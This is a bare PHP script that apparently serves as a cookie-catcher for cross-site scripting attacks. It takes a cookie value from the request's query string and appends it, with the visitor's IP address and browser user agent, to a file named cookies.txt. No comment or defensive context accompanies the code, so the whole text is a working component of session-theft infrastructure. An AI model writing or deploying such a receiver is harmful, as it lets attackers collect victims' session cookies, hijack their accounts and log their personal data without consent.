<?php 
$ip = getenv('REMOTE_ADDR');
$browser = $_SERVER['HTTP_USER_AGENT'];
$cookie = urldecode($_SERVER['QUERY_STRING']);
$file = "cookies.txt";
$fp = fopen($file, 'a');
 
fwrite($fp, $browser. PHP_EOL);
 
fwrite($fp, $cookie. PHP_EOL);

fwrite($fp, $ip. PHP_EOL);
 
fclose($fp);﻿
?>﻿
